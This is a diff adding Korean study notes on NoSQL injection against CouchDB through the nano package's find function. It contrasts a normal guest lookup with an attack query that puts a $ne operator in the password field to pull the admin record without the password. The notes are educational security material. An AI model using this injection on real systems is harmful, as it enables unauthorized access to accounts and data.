@@ -657,3 +657,39 @@
 <br/>
 
 * nano 패키지의 ```find``` 함수를 이용한 공격
+    - ⚠️ ```find``` 함수의 인자로 들어가는 사용자 입력의 타입이 문자열이 아닌 오브젝트 타입인 경우 ```operator```(연산자)를 사용해 의도하지 않은 행위를 수행할 수 있음
+    - 예시: 정상적인 데이터 조회와 악의적인 데이터 조회
+        + 정상적인 쿼리 요청
+            ```javascript
+            require('nano')('http://{username}:{password}@localhost:5984').use('users').find({'selector': {'_id': 'guest', 'upw': 'guest'}}, function(err, result){ console.log('err: ', err, ', result: ', result); });
+            /* 결과
+            undefined
+            err:  null ,result:  { docs:
+                [ { _id: 'guest',
+                    _rev: '1-22a458e50cf189b17d50eeb295231896',
+                    upw: 'guest' } ],
+                bookmark: 'g1AAAAA6eJzLYWBgYMpgSmHgKy5JLCrJTq2MT8lPzkzJBYqzppemFpeAJDlgkgjhLADZAxEP',
+                warning: 'No matching index found, create an index to optimize query time.' 
+            }
+            */
+            ```
+            + 이용자가 요청한 users 데이터베이스의 guest 계정의 데이터를 조회함 (```find``` 함수의 ```selector```로 ```_id```와 ```upw```에 ```'guest'```를 입력함)
+        + ```selector```를 포함한 공격 쿼리 전송
+            ```javascript
+            require('nano')('http://{username}:{password}@localhost:5984').use('users').find({'selector': {'_id': 'admin', 'upw': {'$ne': ''}}}, function(err, result){ console.log('err; ', err, ', result: ', result); });
+            /* 결과
+            undefined
+                err:  null ,result:  { docs:
+                    [ { _id: 'admin',
+                        _rev: '2-142ddb6e06fd298e86fa54f9b3b9d7f2',
+                        upw: 'secretpassword' } ],
+                bookmark: 'g1AAAAA6eJzLYWBgYMpgSmHgKy5JLCrJTq2MT8lPzkzJBYqzJqbkZuaBJDlgkgjhLADVNBDR',
+                warning: 'No matching index found, create an index to optimize query time.' 
+            }
+            */
+            ```
+            + 공격자가 요청한 users 데이터베이스의 admin 계정의 데이터를 조회할 때 ```upw```의 값에 상관없이 admin 계정의 데이터를 조회함 (```find``` 함수의 ```selector```로 ```upw```에 연산자 ```$ne```를 사용해 ```''```이 아니면 데이터를 조회하도록 만들고 있음) <br/> &nbsp;&nbsp; *→ ⚠️ not equal(```$ne```) 연산자를 사용하여 upw를 모르는 상황에서도 원하는 데이터를 조회할 수 있음*
+
+<br/><br/>
+
+### CouchDB 특수 구성요소를 이용한 공격
